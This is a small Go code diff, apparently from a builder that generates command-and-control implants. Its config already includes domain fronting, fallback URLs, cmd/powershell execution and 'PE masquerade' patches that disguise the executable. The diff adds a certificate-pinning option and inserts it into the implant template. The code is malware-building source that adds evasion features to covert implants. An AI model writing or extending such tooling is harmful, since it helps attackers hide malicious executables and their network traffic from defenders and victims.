@@ -36,6 +36,7 @@ type CConfig struct {
 	FrontDomain   string
 	FallbackURLs  string
 	ExecMethod    string // "cmd" | "powershell"
+	CertPin       string // SHA-256 hex of server cert DER, or "" to disable
 	Debug         bool
 
 	// PE masquerade — version resource + post-build patches
@@ -166,6 +167,7 @@ func BuildC(cfg *CConfig) (*Result, error) {
 		"@@FRONT_DOMAIN@@":   cfg.FrontDomain,
 		"@@FALLBACK_URLS@@":  cfg.FallbackURLs,
 		"@@EXEC_METHOD@@":    cfg.ExecMethod,
+		"@@CERT_PIN@@":       cfg.CertPin,
 		"@@DEBUG@@":          boolVal(cfg.Debug),
 	}
 	for k, v := range replacements {
